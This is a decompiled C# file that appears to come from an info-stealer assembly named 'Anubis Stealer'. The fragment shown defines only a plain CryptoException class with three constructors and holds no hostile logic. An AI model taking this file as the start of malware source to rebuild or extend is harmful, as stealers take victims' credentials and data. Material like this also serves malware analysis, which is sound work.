// Decompiled with JetBrains decompiler
// Type: Anubis.CryptoException
// Assembly: Anubis Stealer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4CC1199D-65A9-4D34-AA4B-98216B1632A3
// Assembly location: C:\Users\Administrator\Downloads\Build.exe

using System;

namespace Anubis
{
  public class CryptoException : Exception
  {
    public CryptoException()
    {
    }

    public CryptoException(string message)
      : base(message)
    {
    }

    public CryptoException(string message, Exception exception)
      : base(message, exception)
    {
    }
  }
}
